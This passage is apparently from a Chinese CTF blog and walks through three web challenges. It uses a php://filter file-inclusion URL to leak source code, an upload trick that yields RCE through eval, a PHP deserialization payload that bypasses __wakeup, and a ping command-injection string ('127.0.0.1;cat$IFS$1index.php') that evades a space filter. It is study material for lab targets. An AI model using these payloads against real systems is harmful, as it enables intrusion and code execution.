<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p><img src="/images/5B385211AF574b8f877C1A0B0C5C527D.png" srcset="/img/loading.gif" lazyload><br>题目给的是sql类型，但我们要有自己的想法，像这样的登录窗口，还可能有弱密码<br>本题可以挨个爆uname&#x3D;admin,passwd&#x3D;password<br>传了几个文件，没有对后缀进行过滤，但是上传过后都变为了.txt文件<br>看看url</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">home.php?<span class="hljs-attribute">file</span>=upload<br></code></pre></td></tr></table></figure>
<p>这里的格式感觉有文件包含<br>伪协议测一下</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">home.php?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=upload<br></code></pre></td></tr></table></figure>
<p>成功利用，得到了upload.php的源码</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> </span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="language-xml">	上传文件</span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span></span><br><span class="language-xml">	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ä¸ä¼ &quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;</span><br><span class="language-php">	<span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;</span><br><span class="language-php">	</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;</span><br><span class="language-php">		<span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;</span><br><span class="language-php">		@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php"></span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-variable">$this</span>-&gt;Filename))&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>)&#123;</span><br><span class="language-php">				<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="language-php">			&#125;</span><br><span class="language-php">			<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">				<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;</span><br><span class="language-php">			&#125;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;</span><br><span class="language-php">		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;</span><br><span class="language-php">		<span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="language-php">		<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;Filename;</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;</span><br><span class="language-php">			<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="language-php">	<span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();</span><br><span class="language-php">	<span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);</span><br><span class="language-php">	<span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>看到了eval，但我不知道怎么才能利用到他，但是还有一种方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">getcwd</span>().<span class="hljs-string">&quot;/uploads/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]).<span class="hljs-string">&quot;/&quot;</span>;<br>		<span class="hljs-variable">$ext</span> = <span class="hljs-string">&quot;.txt&quot;</span>;<br>		@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;Filename = <span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>].<span class="hljs-variable">$ext</span>;<br>		&#125;<br><br>		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;<br>		<span class="hljs-variable language_">$this</span>-&gt;token = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>	&#125;<br><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uploader</span>();<br>	<span class="hljs-variable">$uploader</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>	<span class="hljs-keyword">if</span>(@<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploader</span>);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这也解释了我们为什么总是txt结尾了，我们这次提交的时候加上参数name&#x3D;b.php<br><img src="/images/4D4CC0D5BAAE4b81B8FC9B0C66575CFE.png" srcset="/img/loading.gif" lazyload><br>这里还以为把一句话木马写到这个页面了，试了好久没注出来<br><img src="/images/9347E699015B42e0A33D4C4B94FA4A42.png" srcset="/img/loading.gif" lazyload><br>确实是在这个页面上啊。。。。<br>回来看我们的b.php已经创建了<br>执行RCE<br><img src="/images/F077828EDD574fa9BEF5C863D21B60AA.png" srcset="/img/loading.gif" lazyload></p>
<p>看了下wp，这种方法是非预期解，预期解是phar反序列化<br>好把，不知道为什么复现不出来<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/soldi_er/article/details/117702168">GXYCTF2019BabysqliV3.0-phar反序列化正解</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/122930867">phar反序列化</a></p>
<h2 id="SWPUCTF-2021-新生赛-no-wakeup"><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>已知在使用 unserialize() 反序列化时会先调用 __wakeup()函数，</p>
<p>而本题的关键就是如何 绕过 __wakeup()函数，就是 在反序列化的时候不调用它</p>
<p>当 序列化的字符串中的 属性值 个数 大于 属性个数 就会导致反序列化异常，从而绕过 __wakeup()</p>
<p>代码中的__wakeup()方法如果使用就是和unserialize()反序列化函数结合使用的<br>构造序列化代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&#x27;wllm&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>序列化返回的字符串格式：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">O:<span class="hljs-tag">&lt;<span class="hljs-name">length</span>&gt;</span>:&quot;<span class="hljs-tag">&lt;<span class="hljs-name">class</span> <span class="hljs-attr">name</span>&gt;</span>&quot;:<span class="hljs-tag">&lt;<span class="hljs-name">n</span>&gt;</span>:&#123;<span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">name</span> <span class="hljs-attr">1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">value</span> <span class="hljs-attr">1</span>&gt;</span>...<span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">name</span> <span class="hljs-attr">n</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">value</span> <span class="hljs-attr">n</span>&gt;</span>&#125; <br></code></pre></td></tr></table></figure>
<p>O:表示序列化的是对象</p>
<ul>
<li>length:表示序列化的类名称长度</li>
<li>class name：表示序列化的类的名称</li>
<li>n:表示被序列化的对象的属性个数</li>
<li>field name 1：属性名</li>
<li>field value 1：属性值<br>所以要修改属性值n，既把2改为3以上。<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
最好url编码一下，这样我们就绕过wakeup哩</li>
</ul>
<h2 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h2><p><img src="/images/D83E06DA3B3F4f119814F5F53C8CF867.png" srcset="/img/loading.gif" lazyload><br>存在命令执行，用管道符隔开，空格等一些特殊字符被禁用了，但$没有，可替代空格</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;cat$IFS$<span class="language-php"><span class="hljs-number">1</span>index.php</span><br><span class="language-php"></span><br><span class="language-php">	<span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="language-php">		<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];</span><br><span class="language-php">		<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;</span><br><span class="language-php">			<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$match</span>);</span><br><span class="language-php">			<span class="hljs-keyword">print</span>(<span class="hljs-variable">$ip</span>);</span><br><span class="language-php">			<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;</span><br><span class="language-php">			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);</span><br><span class="language-php">		&#125;</span><br><span class="language-php">		<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);</span><br><span class="language-php">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="language-php">		<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);</span><br><span class="language-php">	&#125;</span><br><span class="language-php"></span><br><span class="language-php">	<span 